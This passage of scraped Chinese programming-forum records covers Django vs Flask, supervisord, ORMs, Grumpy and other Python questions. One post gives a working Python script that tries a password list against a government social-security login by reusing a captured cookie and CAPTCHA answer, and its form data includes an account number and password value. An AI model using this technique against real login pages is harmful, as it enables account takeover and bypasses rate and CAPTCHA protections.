args\r", "            self.kwargs = kwargs\r", "            return self.dispatch(request, *args, **kwargs)\r", "        view.view_class = cls\r", "        view.view_initkwargs = initkwargs\r", "\r", "        # take name and docstring from class\r", "        update_wrapper(view, cls, updated=())\r", "\r", "        # and possible attributes set by decorators\r", "        # like csrf_exempt from dispatch\r", "        update_wrapper(view, cls.dispatch, assigned=())\r", "        return view", "打个断点，一步一步的看执行的流程,你就明白了"]},
{"content": ["<div class=\"topic_content\">我现在有一个 group GGG 。包含两个进程 GGG:aaa GGG:bbb 并且正在运行。现在想添加第三个进程 GGG:ccc 到 GGG 这个组中并且不影响之前运行的两个进程。但是用 supervisorctl 提供的 reread 和 update 命令只能整体重启 GGG 这个组？有什么好的办法吗，目前能解决的办法只能让 ccc 这个进程不属于 GGG 组而作为独立管理的进程。</div>"], "reply": "5", "tittle": "supervisord 如何动态的向一个正在运行的 group 添加一个新的 process？", "comment": ["reload", " reload 会重启之前正在运行的进程，我不希望打断之前的程序。", " 如果是这样，那请问， reload 和 restart 有什么区别？为什么要多一个 reload ，你可以看看 reload 的源码是怎么实现的", "reread?update?", " 这个我在问题中提过。 update 命令会导致重启整个 group 下的所有进程。但我只想添加新的进程到这个 group 并启动。不想重启 group 中正在运行的其他进程。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>之前有 Django 的经验，最近看了看 Flask 。</p>\n<p>还是觉得初学者先用 Django 比较好。</p>\n<p>Flask VS Django 有点像 ubuntu VS macOS</p>\n<p>Django 有清晰的文档和简单地设计，自成一派。通过 Django 的学习，你大概知道现代 web 框架的开发流程。\nFlask 做的事情，都是经过拓展。学习的过程中会迷失在寻找插件中。学习使用的过程中，会迷失在插件的文档中。</p>\n<p>Django 的特点，就是都帮你设计好了。 Flask 就是需要你自己来。但是换个角度，针对某些广泛的业务，无非就是， MVC 那一套， Model 层的 ORM ， View 后台渲染模板， C 的控制逻辑。 Django 全都给你，还给你清晰的文档。而 Flask 就要你自己来凑，凑成 Django 的模样。</p>\n<p>Django 有大而全的文档，其实学习只要前面的初级教程罢了，用到再查。并不需要看多少。\nFlask 的文档，却被分散到每个拓展模块，模块的开发，设计，文档参差不齐，选用插件，很考验眼力和经验。我想这并不适合初学者。</p>\n<p>Flask 可以把一个网站写在一个文件里，但是这种灵活性往往是，没啥意义。我们期望于清晰可拓展的文件结构。同样，这个工作还要用户自己来做。</p>\n<p>总之， Flask 做着做着，就变成了 Flask 实现的 Django 。</p>\n<p>就像 Ubuntu ，很多极客配置来配置去，你无非想配置成 macOS ，何不直接用 macOS 。</p>\n<p>我现在觉得 Flask 的适合那种，研究比较深入，业务比较独特的。或者就想从头到尾自己架构的。对 Flask 本身以及组件开发具有深入了解的人。</p>\n<p>但是如果你只是想快速搭建 web 。而不是纠结框架和技术本身。我觉得应该从 Django 开始。</p>\n</div></div>"], "reply": "36", "tittle": "我觉得新手还是 Django 开始吧", "comment": ["是的，和我看法差不多", "我在想，指定特定的功能，逻辑是守恒的，当你去实现的和拆分一定是>= 纯实现逻辑。\r", "\r", "ORM ，路由，模板渲染，用户认证，这些基本上本来就需要。交给不同人，就会产生很多冗余。\r", "\r", "我想如果 Flask 同等条件下把功能 拼凑成 Django ，应该比 Django 本身还大，速度还慢才对。 Django 内部的系统，沟通起来应该更顺畅一些。\r", "\r", "还是就是 Django 的写法比较一致。 Flask 的会被插件，组件所左右和捆绑。\r", "\r", "我们常听到， Django 会捆绑用户，但是 Flask 只是换了个方式捆绑用户罢了，用插件捆绑用户。而这种捆绑有着更大的不确定性，因为依赖了插件作者——如果全部重头自己来——别忘了，我们的目的，只是想又快又好的构建 web 而已。而不像陷入造轮子的汪洋大海里。\r", "\r", "这是我的个人理解。\r", "我倾向于推荐整体方案。 Django 的那套学会，完全可以参考 Django ，使用 Flask 的灵活性，去按照设计思想构建自己的框架。\r", "\r", "但是刚开始，对于新人，清晰度，完整性，更重要。灵活性对新人反而有害，不利于交流（如果大家用的组件都不一样，就完了。这是我看书的经验。每本 Flask 的作者都倾向于用自己挑选的一套组件解决问题。很难交流。书具有时间的滞后性。）", "个人开发者：建议用 django\r", "团队开发：建议用 flask", "这两个都太复杂了，相比起来我更推荐 Tornado", "uliweb: ", "认同， Python Web 最开始我是从 Django 入手，后来用 Flask ，前后比较基本上如楼主所言", "如果 LZ 是想讨论的话，那我的观点和您的完全相反：新手适合从 flask 开始。\r", "我是一名产品设计师，行业 4 年左右开始学习编程的（之前完全没经验），选择 python 后面临学什么框架的问题，也是最后面临这两个选择，最终选了 flask ：\r", "1 、 flask 是微型框架，基于 python 这样语法简介的语言之上，因此很容易写出 hello word ，然后再深入； Diango 则相反，因为定位本来就是生产。新手需要渐进学习和理解，这样 flask 更适合。当初也是听说学 Django 不要学 flask 这样的玩具浪费时间，但是折腾半天总是有些问题，一个很简单的单页应用都难弄，所以转而学 flask ，结果是好的。\r", "2 、 flask 所需的一些基本用得到的扩展， flask 官方都有维护，这样直接挑选官方的包没有负担，我没遇到你说的选用插件要考眼力。一个 web 程序常规所需的扩展 flask 官方都有维护， Django 自己有；额外的一些扩展， flask 有， Django 少，都不是官方维护的都一样层次不齐。而且这些官方扩展文档写的很清晰，我都看得懂，当然这也许是 python 语言本身的功劳，现在学 swift 后这点体会更深。\r", "3 、只有最初初学的那个阶段才写一个文件，很快接触了蓝图之后，就拓展了文件结构，之后就再也不写 [一个文件] 的应用了，除非真的需要。也就是说 flask 从来也没说写在一个文件是好的，或者不让弄个清晰的结构。 Django 如 LZ 所说，上来结构就很好，但这样恰恰在最初难住我，因为我还不够理解结构化的意义，而 flask 让我最终明白结构的意义。\r", "4 、或许 flask 最终== Django ， Ubuntu 最终== macOS ，但都绝对不会是===，差之毫厘，失之千里，这个我也不多解释，深入玩过（踩过不少坑）的人都知道。\r", "\r", "哎，不浪费时间争这个了，新手吗，看缘分先遇到什么教程，什么教程看得懂并喜欢就先学哪个了。\r", "3 、", "轻量的框架，重量的工作，工作量守恒定律。", "个人觉得新手从 flask 或者 tornado 入手比较好， django 比较时候快速开发", "赞同楼主，新手还是学个最简单、学的人最多的，，等会了之后再考虑灵活性、扩展性之类的问题\r", "\r", "也许 Django 的模板不如 Jinja2 、也许 Django 的 ORM 不如 SQLAlchem 、也许 Django 的 Admin 太呆板定制化困难，，可这都是高手需要考虑的问题，，菜鸟还是先学会怎么搭出个能用的网站来再说吧", "两者都用过， flask 学习曲线比较陡。推荐 Django ！", "Ruby 圈有句话叫 You will end up reinventing Rails, in a horrible way.\r", "\r", "其实换到 Python 圈也成立啊。无论你用 Flask 、 Tornado 、 Web.py ， You will end up reinventing Django, in a horrible way.", "我觉得 7 楼说的非常好,\r", "最多是== 不可能是=== .\r", "而且都是 Python 写的 个人觉得不论输赢比较好.\r", "况且, 实际上做大站开发还是 tornado 比较多吧.", "既不懂 django ，也不懂 flask 。", "个人也觉得 django 入手比较好。也许是 flask 为了灵活，只给了一个最简单的框架，很多东西由你自己去扩展。所以新手入门的时候参考的教程是一个教程一个写法，看教程都看晕了。", "大而全 vs 小而美， express vs koa ， django vs flask", "道理我都懂，可是想学 django 没有可靠的参考书啊", " 官方文档。", "上手用 django ，新手不会感觉那一坨一坨的回调是什么意思呢？会不会感觉，为毛，我这里要重载这个成员函数呢？。。。", " 不不不，我只是在抱怨市面上卖 django 的书太少了", " 我意思是你为啥不去看文档而去看书呢？一般书出来就落后了。一切以官方文档为准啊。", " 没说反？", " 我一开始学 django 。发现很多东西不懂，然后看到 FLASK 那本书，就愉快的去学习 flask 了。。", "为什么不用 PHP", " 实力拉一波仇恨.........", "插个嘴， flask 有 Django 那么好用的 admin 了吗？", " Django 最大的感触就是官方文档太好了 根本不需要额外的东西", " 因为对 Py 爱的深沉 :D", "django 那一坨坨的目录代码我都吓尿了， flask 非常方便入门，从无到有，一点点慢慢补充，需要什么加什么", "说的都有道理，但是对于真正零基础入门 python web 的小伙伴来说，还是越简单些越好吧。不然，学着学估计就被吓跑了。", "大家对 Pyramid 怎么看？", "最主要是找个好老师。自学能力强的，找自己当老师；自学能力差点的，找搜索引擎当老师；再差点的，得找真人当老师；还不行的话，快转行吧。", "我不想配成 macos ， i3wm 的酸爽只有用过的人才知道。", "把 flask 用成 django ，把 ubuntu 配置成 macos 的成就感,以及在这之间学到的东西是直接用 django,macos 的人无法想像的。\r", "\r", "\r", " 平铺的酸爽让我在 macos 下只用虚拟机", " 我觉得你的观点挺好。就是自己一点加进去。 Flask 适合学习和步进。最后自己形成一套 Flow 。和使用一组依赖。和 Django 确实是两种风格的。今天感受到 Django 的一种闭塞。就是 Django 的庞大，让我不知道他到底做了多少工作，也很蛋疼。研究 Django 也要花时间。 Web 啊，就是一种很细碎的工作，涉及面多而零碎。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>数据库入门水平，也了解了一下 SQLAlchemy, SQLObject, 和 Storm 。想请教一下各有什么优劣？ 哪一个更适合长期发展。</p>\n<p>谢谢</p>\n</div></div>"], "reply": "10", "tittle": "求推荐一个 Python 下的 ORM - sqliteDB", "comment": ["SQLAlchemy 吧\r", "\r", "这玩意就是个工具，谈什么长期发展", "peewee 怎么样", "dataset", "peewee +1", "peewee 简单好用", "peewee + 1", "### SQLAlchemy \r", "用起来很美，功能很全，相对的来说会学习成本比较大，我试过两次想看着文档学习都坚持不下去了，只会基础的用法，不会了再去学习。\r", "\r", "### peewee \r", "相对来说就会好很多，你对于他能做什么有一个大致的了解，源码在一个文件里面也相对容易学习。\r", "\r", "### 长期发展\r", "我还是推荐你用 MySQLdb 直接写 sql ，开发人员需要熟悉 sql ，也要知道怎么优化，个人感觉如果非要用 orm 的话可能就绑在工具上了，优化 sql 的机会可能就比较少了。如果担心代码太混乱的话不如封装个模型层，将脏操作放在模型里面，再细化的话可以再封装一个数据操作层。\r", "\r", "##### 只是个人感受，希望对你有帮助~", " 感谢，我目前是准备在一个工具里面使用，所以我觉得 peewee 差不多够了。", " 恩恩，加油~", "如果会一点 Django ，推荐用 Django 的 ORM ，相对 Peewee 和 SQLAlchemy ，非常 humanize ～\r", "如果不想接触 Django ，推荐用 SQLAlchemy ， Peewee 的设计感觉不完全像个 ORM"]},
{"content": ["<div class=\"topic_content\">爬取的是 2m3m 网站上的域名数据，比较容易爬取，下一步打算爬取抢米网的。另外还写了一个域名检索的程序，可以进行基本的检索，如全字母，全数字，限制长度，数字+字母，包含某个字符以及字符+英文单词，并且加入了查询域名是否已注册的程序。\r<br>github:https://github.com/gaokaigithub/2m3m</div>"], "reply": "7", "tittle": "又写了一个域名爬虫", "comment": ["还以为我被盗号了", " 哈哈哈，这么巧", "走的人家接口\r", "其实可以拿 whois 信息的", " 嗯嗯，也写过直接用 whois 的，因为用万网的 api 简单，就直接用了", "好像不错，研究研究", "目的是啥啊？  我有写过一个小网站  ", "   ,删除域名在 ", "    ，\r", "没理解兄台从 2m3m 抓啥内容，它自己也是从别的地方抓来的数据啊", " 抓数据主要用来自己分析，找自己想要的域名"]},
{"content": ["<div class=\"topic_content\">python3 其他改进还好，就是这个 print ，设计成函数 print(\"hello world\")，感觉不简洁了。</div>"], "reply": "10", "tittle": "print \"hello world\" 多好", "comment": ["恩。一开始我也这么觉得。但是习惯了也还好。\r", "你可以看看几个讨论：\r", "\r", "\r", "官方基本在 3.0 的介绍里都会把「 Print Is A Function 」放第一个。", "设计成函数方便传参数控制输出格式，也可以 from pprint import ppring as print 这样，总结起来就是增加灵活性减少暗坑", "等你要把 print 作为回调函数的时候你就知道这个改进有多好了", "你要简洁为什么还要用 Python ？", " OK, let's ruby... and on rails!", "IDE 不帮你干好了吗?自动补全。", "感觉还是函数调用不需要括号爽。", " Haskell 大法好", " Ruby, Elixir, F# 都不用呀。", "习惯就好, 反正为了 Python3 可以无视 u\"哈哈\"这一条打死我都要上船"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近需要用 python 写一个 DSL 解析器， DSL 就是一个字典格式，用过 goldendict 的人可能知道，格式与 HTML 很像，解析的方法应该与 HTML 解析器差不多，所以想知道现在比较流行的 HTML 解析器（如 python 的 beautifulsoup 和 java 的 jsoup ）是如何实现这一功能的。查资料只查到了 ply 这个库，是一种 lr parser ，不知道这种方案能不能满足需求，因为我并没有找到用 ply 解析 HTML 的相关例子。</p>\n<p>也许看 beautifulsoup 或者 goldendict 的源码可以解决问题，不过在不明白原理的情况下确实很难看懂源码，在网上搜索出来的信息大部分也都是利用相应的库解决，并没有找到自己想要的资料，所以希望能给个关键字或者教程之类的，学习一下，谢谢。</p>\n<p>附上一份 dsl 样本： <a href=\"https://github.com/Tvangeste/SampleDSL/blob/master/sample.dsl\" rel=\"nofollow\">https://github.com/Tvangeste/SampleDSL/blob/master/sample.dsl</a></p>\n</div></div>"], "reply": "5", "tittle": "如何手写一个 HTML 解析库？", "comment": ["来吧 龙书参上", "嗯 来个简单点的吧解析 JSON 并且通过 ", " 所有 case 再试试 HTML\r", "\r", "HTML5 Testsuite\r", "是 xml 格式的吗？是的话你需要的应该是 xml 解析库。。", "可以来看下这篇文章 ", " 不是 xml 格式\r", " 谢谢！看起来正是我所需要的"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><ul>\n<li>开发语言\n<ul>\n<li>后端： python</li>\n<li>前端: html</li>\n</ul>\n</li>\n</ul>\n<ul>\n<li>流程图简介</li>\n</ul>\n<p><img alt=\"流程图\" src=\"http://www.yunsonbai.top/images/push/fx.jpg\"></p>\n<h4>重点在于应用 websocket ，界面有点丑。</h4>\n<p><a href=\"http://www.yunsonbai.top/2016/12/18/%E5%88%A9%E7%94%A8websocket%E5%AE%9E%E7%8E%B0%E8%81%8A%E5%A4%A9%E5%B0%8F%E5%BA%94%E7%94%A8/index.html\" rel=\"nofollow\">原文链接</a></p>\n</div></div>"], "reply": "9", "tittle": "基于 websocket 的聊天小应用", "comment": ["我前段时间在学校和我的前端哥们也是这么设计的，写的一个 1 对多的类似阿里旺旺的功能，聊天数据的持久化我们当时没做。", " 👍", "用 socket.io 做起来更方便", "之前也使用 Python 建了一个，只不过用的 tornado 框架搞的，自带 websocket", "目前公司一个项目我用的 netty 和 websocket ，实现了 iOS ，安卓，微信 h5 和 pcweb 多端通信，客户端实现心跳和断线重连，开发正式项目完全没问题的", " 回头用下 tornado", " 嗯，心跳有好多好处，能确定客户端是否还存在、确保连接可用等等", "去年毕业设计就搞得这个 后端是 node 写的 socket.io 很好用~", "tornado 官方的一个 websocket[demo]( "]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>各位大咖，谁对 matplotlib 比较熟悉呀？遇到一个问题，</p>\n<p>在 spyder 的 IDE 下执行时，图形显示正常，但是执行 fig.save 后，保存的图片就少了一半，这是咋回事？</p>\n<p>在 Spyder 下默认运行:\n<img alt=\"\" src=\"http://pic.cdn.lizenghai.com/uploads/2017/01/1.png\"></p>\n<p>执行个 fig.show()\n<img alt=\"\" src=\"http://pic.cdn.lizenghai.com/uploads/2017/01/2.png\"></p>\n</div></div>"], "reply": "5", "tittle": "matplotlib 绘图问题，这个问题实在给跪了 - -！", "comment": ["你是不是没设置图片摆放顺序啊\r", "就 demo 里面最开始设置的的 211 111 什么的", " 我没有设置呀。没有使用 fig.add_subplot ，而是用的：\r", "\r", "ax1 = fig.add_axes([0, 1, 1, 1])\r", "ax2 = fig.add_axes([0, 0.35, 1, 0.5], axis_bgcolor='w')", "没太看懂题目说什么, 不过两个图得用 subplot", " 就是， spyder 下跑的代码直接在 console 里的执行结果（图 1 ）和保存下来的执行结果（ 2 ）完全不一样呢。\r", "\r", "两个图我是用 add_axes 的方式来画的", "bbox_inches 看看有没有这个属性"]},
{"content": ["<div class=\"topic_content\">目标：\r<br>\r<br>Grumpy is a Python to Go source code transcompiler and runtime that is intended to be a near drop in replacement for CPython 2.7. \r<br>\r<br>\r<br>\r<br>原理： python sc -&gt; | Grumpy | -&gt; go sc -&gt; native\r<br>\r<br>The key difference is that it compiles Python source code to Go source code which is then compiled to native code, rather than to bytecode. This means that Grumpy has no VM. The compiled Go source code is a series of calls to the Grumpy runtime, a Go library serving a similar purpose to the Python C API (although the C API is not directly supported).\r<br>\r<br>\r<br>\r<br>关于库：\r<br>\r<br>Python 标准库和 Grumpy 库分为两部分，具体看下面\r<br>\r<br>Python 标准库 ： Much of the Python standard library is written in Python and so it \"just works\" in Grumpy. These parts of the standard library are copied from CPython 2.7 (possibly with light modifications). For licensing reasons, these files are kept in the third_party/stdlib subdir.\r<br>\r<br>The parts of the standard library that cannot be written in pure Python, e.g. file and directory operations, are kept in the lib subdir. In CPython these kinds of modules are written as C extensions. In Grumpy they are written in Python but they use native Go extensions to access facilities not otherwise available in Python.\r<br>\r<br>\r<br>关于Python3\r<br>\r<br>看样子，貌似是后续可能会支持，或者单独fork一个python3的版本。\r<br>\r<br>\r<br>仓库地址：\r<br><a target=\"_blank\" href=\"https://github.com/google/grumpy\" rel=\"nofollow\">https://github.com/google/grumpy</a></div>"], "reply": "30", "tittle": "Grumpy: Go running Python， python 很得 “人和”，对，说的是 CPython2.7", "comment": ["所以相当于一个编译器而不是解释器？", "但是我用了 flask ，能搞定？", " 源码翻译工具。\r", "\r", "Python 在运维等几个场景很有优势，\r", "go 在效率和部署方面有很大优势，\r", "这二者结合，感觉有戏。\r", "\r", "不爽的是 Google 弃坑的习俗……", " 我知道是源码翻译工具，但最终翻译成了 native code ，所以是二进制机器码？如果是，那就成了编译器了，速度应该会有显著提升", " 所以你觉得是 python 的编译工具喽？\r", "抱歉，并不是。如果是的话，又和 go 有什么关系呢", "看见 go 第一反应已经是围棋了→_→\r", "试试对二进制 c 扩展的库支持", "也有好处，运维脚本直接往服务器上一丢就行了，不用费心环境了。\r", "\r", "当然前提是 Google 管生又管养，毕竟这不是 Go 这种大项目。", "那为嘛不用 Nuikta 编译到 C++呢？", " 你还需要编译环境，尤其是版本复杂的时候", "这个翻译器还不如 j2objc ，完全没可读性：\r", " 那你觉得这玩意儿的主要目地是什么？", " 编译成 Go 也需要编译环境啊。‘版本复杂的时候’ 是啥意思？不好意思没看懂，有点懵", "坐等有人搞出个 decorator\r", "\r", "比如：\r", "\r", "\r", "    @", "\r", "    def aaa():\r", "        pass", " 说实话，这问题我十分不乐意回复，然而，强迫症……\r", "\r", "我的第一个回复里面讲得很清楚了", " 正是因为看了你的第一个回复和第二个回复，我才觉得你说的非常有问题，你说不需要编译，那我问你如果把 python 翻译成 go 而速度得到提升，你觉得是什么原因？你懂编译原理不？", " 跟版本什么关系？\r", "```\r", "tools/grumpc hello.py > hello.go\r", "go build -o hello hello.go\r", "```\r", "只是把 Python 源码翻译成 Go 的", " 其实翻译不是终极目地，终极目的是用 go 的编译器", " \r", " \r", "我是说 Nuikta 编译到 C++，如果遇到系统版本 /libc 版本复杂的时候就不好玩了，这个在一个多年公司里也是比较常见的情况。\r", "编译成 Go 可以编译一次到处运行嘛。", "- -我本还一直想拿 golang 给 py 写个 wsgi （结果一直没时间。。。。。看来。。。可以拿这个撸撸", " nuitka 这玩意有人在生产环境用过不？几乎找不到什么案例。", "这个东西要成功的前提是 先提出一个语言规范. 规范什么能做什么不能做\r", "\r", "否则要兼容 cpython, jython/ironpython/pypy/pyston 这么多年现在都在前面踩坑呢", "这多半只是 Google 内部自用的老代码迁移转换器，不是给你在生产环境用的。", "\r", "\r", "\"But the biggest advantage is that interoperability with Go code becomes very powerful and straightforward: Grumpy programs can import Go packages just like Python modules!\"", "正打算用这个试试看可能提升下 falcon 框架", "额，这翻译出来的东西。。。\r", "按照官方的教程。。。\r", "\r", "python 代码： print \"hello, world\"翻译成了\r", "```go\r", "package main\r", "import (\r", "\tπg \"grumpy\"\r", "\tπ_os \"os\"\r", ")\r", "func initModule(πF *πg.Frame, _ []*πg.Object) (*πg.Object, *πg.BaseException) {\r", "\tvar πTemp001 []*πg.Object\r", "\t_ = πTemp001\r", "\tvar πE *πg.BaseException; _ = πE\r", "\tfor ; πF.State() >= 0; πF.PopCheckpoint() {\r", "\t\tswitch πF.State() {\r", "\t\tcase 0:\r", "\t\tdefault: panic(\"unexpected function state\")\r", "\t\t}\r", "\t\t// line 1: print \"hello, world\"\r", "\t\tπF.SetLineno(1)\r", "\t\tπTemp001 = make([]*πg.Object, 1)\r", "\t\tπTemp001[0] = πg.NewStr(\"hello,\\x20world\").ToObject()\r", "\t\tif πE = πg.Print(πF, πTemp001, true); πE != nil {\r", "\t\t\tcontinue\r", "\t\t}\r", "\t\treturn nil, nil\r", "\t}\r", "\treturn nil, πE\r", "}\r", "var Code *πg.Code\r", "func main() {\r", "\tCode = πg.NewCode(\"<module>\", \"hello.py\", nil, 0, initModule)\r", "\tπ_os.Exit(πg.RunMain(Code))\r", "}\r", "\r", "```\r", "我还以为会翻译成 fmt.Println(\"hello,world\")", " naive ", "   ", " ", " 所以突然感觉我也好 naive 。。。。既然这样，那中间代码是 go 还是 C 不都一样么。。。干脆叫 python 编译器。。。", " 以我的理解,主要的作用还是规避 GIL 和部署更方便吧.单从运行效率来看,不一定会高很多", " 如果他不这么做，那大量依赖 python 动态语言特性的 lib 不都报废了，看着是效率高了，实际上这个项目也就没有存在的意义了", "目前发现三点：\r", "一、将 python 翻译成 Go 的时候会把线程翻译成 goroutine ，这样线程就非常轻量了。\r", "二、 python 里面可以直接调用 Go 的标准库， from __go__.net.http import ListenAndServe ， python 的库就更丰富了。\r", "三、翻译成 Go ，可以用 Go 的跨平台编译特性，直接编译成不同平台的二进制文件，易于分发。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>程序代码如下：</p>\n<pre><code>import os\nprimenumber=2\ntestnumber=primenumber\n\nwhile True:\n\twhile True:\n\t\ttestnumber=testnumber-1\n\t\tif testnumber==1:\n\t\t\tprint(primenumber)\n\t\t\tprimenumberwrite=str(primenumber)\n\t\t\tf=open(\"PrimeNumber.txt\",'a')\n\t\t\tf.write(primenumberwrite)\n\t\t\tf.write('\\n')\n\t\t\tf.close()\n\t\t\tbreak\n\t\telif primenumber%testnumber==0:\n\t\t\tbreak\n\tprimenumber=primenumber+1\n\ttestnumber=primenumber\n</code></pre>\n</div></div>", "<div class=\"topic_content\">根据 @<a target=\"_blank\" href=\"/member/GoForce5500\">GoForce5500</a> 的提示，运算程序更新。\r<br>代码如下：\r<br>```\r<br>import os\r<br>primenumber=2\r<br>testnumber=2\r<br>\r<br>while True:\r<br>\twhile True:\r<br>\t\tif testnumber==primenumber:\r<br>\t\t\tprint(primenumber)\r<br>\t\t\tprimenumberwrite=str(primenumber)\r<br>\t\t\tf=open(\"PrimeNumber.txt\",'a')\r<br>\t\t\tf.write(primenumberwrite)\r<br>\t\t\tf.write('\\n')\r<br>\t\t\tf.close()\r<br>\t\t\tbreak\r<br>\t\telif primenumber%testnumber==0:\r<br>\t\t\tbreak\r<br>\t\ttestnumber=testnumber+1\r<br>\tprimenumber=primenumber+1\r<br>\ttestnumber=2\r<br>\r<br>```\r<br>（附言不支持 MD ，脑补缩进符）</div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>可以用MD</p>\n<p>代码如下：</p>\n<pre><code>import os\nprimenumber=2\ntestnumber=2\n\nwhile True:\n\twhile True:\n\t\tif testnumber==primenumber:\n\t\t\tprint(primenumber)\n\t\t\tprimenumberwrite=str(primenumber)\n\t\t\tf=open(\"PrimeNumber.txt\",'a')\n\t\t\tf.write(primenumberwrite)\n\t\t\tf.write('\\n')\n\t\t\tf.close()\n\t\t\tbreak\n\t\telif primenumber%testnumber==0:\n\t\t\tbreak\n\t\ttestnumber=testnumber+1\n\tprimenumber=primenumber+1\n\ttestnumber=2\n</code></pre>\n</div></div>"], "reply": "13", "tittle": "Python 写的计算质数的程序，怎样才可以提高运算效率？", "comment": ["这种没啥复杂度的程序用 c 写，然后 python 调用就行了", "打表", "换成 c ，可以快几十倍。", "换个算法", "你的文件操作不要写在循环的最内层。\r", "可以先放在内存里，累计到一定量之后往文件里写一次", "打开文件挪到循环外面去", "这种就不要自己算了。打表。", "这代码有太多值得优化的地方。\r", "优先检查小数而不是大数，小数是更多数的因数，例如被测数为 1000000000 不需要从 999999999 测试到 500000000 ，能被 2 整除然后直接就返回了，立省 500000000 次运算。\r", "尽量减小测试数据范围，测试质数时只需要测试是不是能够被 2~待测数的开方整除就行，比如测试 36 只需要测到 6 即可，一下快 6 倍……\r", "检查最后一位是不是 0 、 2 、 4 、 5 、 6 、 8(需要大于 2)，这些数不可能为质数，又能省一部分运算。\r", "Coursera 上普林斯顿大学 Algorithm 的主讲教授 Robert Sedgewick 的课程能帮助你。用他的原话来说就是除非你的算法和数据结构都已经高度优化否则不要依赖超级计算机，好的数据结构和算法才能够真正解决问题。", " owo", "楼主可以百度一下 线性筛法 ， 其实打表更好", "这种问题前人已经深入研究了很多年，站在前人的肩膀上，不要闭门造车", "1. 质数算法已经很成熟了，如果只是要提升速度的话不如换个算法。\r", "2. 回复可以用 MD ，右下角有选择框可以选 MD 。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h2>我是如何找回社保卡的登录密码的</h2>\n<p>前一阵子想查询社保,结果忘记登录密码了.今天公司停电,又听同事说只要身份证就可以去社保局重置密码.于是我就兴冲冲地去了.结果在自助终端需要支付密码,在柜台需要社保卡.<strong>mmmp!</strong><br>\n回到家里后就撸了这个程序</p>\n<h3>Step</h3>\n<p><strong>首先登录界面长这个样子</strong></p>\n<p><img alt=\"\" src=\"http://dick129418-3-dick129418.hz.tenxapp.com/static/upload/85b6b2da-d316-11e6-b710-02420a013221.png\"></p>\n<p><strong>下面是表单重点</strong></p>\n<p><img alt=\"\" src=\"http://dick129418-3-dick129418.hz.tenxapp.com/static/upload/f189f45e-d316-11e6-b710-02420a013221.png\"></p>\n<p><strong>其中</strong></p>\n<ul>\n<li>Request Url(请求地址)</li>\n<li>Request Method(请求方式)</li>\n<li>Cookie(这个里面应该记录着你请求的哪一张验证码)</li>\n<li>Form Data(传输的数据)</li>\n</ul>\n<p><strong>代码</strong>\n#coding: utf-8\nimport urllib2\nimport urllib\nfrom cookielib import CookieJar\nfrom time import sleep</p>\n<pre><code>opener = urllib2.build_opener()\nopener.addheaders.append((\"Cookie\", \"粘贴 cookie 至此\"))\n\n# 这里将网页上的数据弄过来\nformdata = formdata = {\"username\": \"022396919\", \"password1\": \"\", \"sfz\": \"\", \"checkCode\": \"336\", \"m\": \"null\",\n        \"state\": \"null\", \"redirect_uri\": \"http://insurance.cdhrss.gov.cn/GetTokenAction.do\",\n        \"response_type\": \"code\", \"client_id\": \"yhtest\", \"e\": \"null\", \"password\": \"13536415\"}\n# 这里填写你的密码列表\npasswords = [\"password1\", \"password2\", \"password3\"]\nfor password in passwords:\n    formdata[\"password\"] = password\n    data_encoded = urllib.urlencode(formdata)\n    response = opener.open( \"http://jypt.cdhrss.gov.cn:8045/yhjypt/oauth/authorizeNoCaAction!getCode.do\", data_encoded)\n    content = response.read()\n    print \"登录失败,社保编码或查询密码有误!\" in content, password\n</code></pre>\n<h3>结果</h3>\n<p><img alt=\"\" src=\"http://dick129418-3-dick129418.hz.tenxapp.com/static/upload/3deb1af2-d318-11e6-b710-02420a013221.png\"></p>\n<p>上面的判断是<strong>看是否这个查询密码错误是否出现在返回的数据中</strong>, 而这个红色箭头所指的地方就是查询密码没有出现错误, 所以就用这个<strong>False</strong>所对应的面去网站试试,结果当然是成功的了</p>\n<h3>其他</h3>\n<p>其实验证码判断的依据是你用什么<strong>凭证</strong>去验证你的验证码,所以你的凭证在没有改变时,你用当前的凭证是可以进行多次验证同一个验证码的.如果你发现验证码有问题.那就打开调试,然后点击验证码图片,然后请求验证码图片,<strong>填写当前验证码并把当前请求里面的 Cookie 更新进代码即可</strong>.Over~</p>\n<p><a href=\"http://dick129418-3-dick129418.hz.tenxapp.com/blog/9\" rel=\"nofollow\">博客原文</a></p>\n</div></div>"], "reply": "7", "tittle": "[Python_request_with_Cookie]我是如何找回社保卡的登录密码的", "comment": ["只防人不防机器人的机制。。。", " 有几个又能防止机器人.何况这是国企", "要是发验证码的时候把验证码的值放在服务器的 session 中你还有办法不。", " 你应该说的是换 key, 但是它依然还是有个请求是获取图片的,而且这个图片还是比较简单那种,依然很好破解", "上次爬一个小说站就是这么搞的。。", "意思是你有一堆常用密码但是不记得到底是哪一个了. 所以就穷举了一下是吗? 然后你这个脚本的作用是不想每次都输入验证码?", " 是账号密码,验证码 都要.因为你没有成功登录这个网站, 所以浏览器也不会记住你的账号"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>request.Request 实例重用时如何改变 URL 及 headers?   PY3.5</p>\n<p>下例中：翻页可以，但一旦选择书籍 id 就会抛出 HTTP Error 400: Bad Request 异常</p>\n<p>比如：在书名输入时，输入 3 ，在结果中选择 0 （按 f 翻页不会）</p>\n<p>将此时的网址提出来单独测试，却能正确打开！</p>\n<p>问题出在哪里尚不知</p>\n<p>from urllib import request,parse</p>\n<p>import re</p>\n<p>pat_books = re.compile() # 显示有问题见下面的回复</p>\n<p>pat_home = re.compile()  # 显示有问题见下面的回复</p>\n<p>headers = {</p>\n<pre><code>        \"Referer\":\"http://so.mianhuatang.la/\",\n\n        \"User-Agent\":\"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36\\\n        (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36\"\n       }\n</code></pre>\n<p>class Search_req:   #</p>\n<pre><code>def __init__(self):\n\n    self.url = r'http://so.mianhuatang.la/cse/search?q={}&amp;p={}&amp;s=7965856832468911224&amp;entry=1'\n    self.books = []          # 书籍(章节)列表 [(url,name),]\n    self.bkname = ''\n    self.req = request.Request(self.url,headers=headers)\n    \ndef _search(self,url):\n    